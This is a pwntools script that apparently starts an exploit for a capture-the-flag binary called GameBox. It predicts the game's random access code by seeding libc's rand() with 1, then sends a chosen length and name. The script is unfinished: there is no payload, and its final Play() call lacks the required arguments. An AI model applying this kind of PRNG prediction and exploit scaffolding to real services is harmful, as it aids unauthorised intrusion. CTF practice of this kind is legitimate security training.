#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
from ctypes import CDLL
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./GameBox.dms")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./GameBox.dms")
    libc = elf.libc


else:
    io = remote("localhost", 9999)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def Play(length, name):
    io.sendlineafter("xit\n", "P")
    s = []
    for i in xrange(24):
        s.append(chr(dll.rand() % 26 + ord('A')))

    s = "".join(s)
    #  print s
    io.sendlineafter(":\n", s)
    io.sendlineafter(":\n", str(length))
    io.sendafter(":\n", name)

if __name__ == "__main__":
    dll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    dll.srand(1)

    Play()

    
    io.interactive()
    io.close()



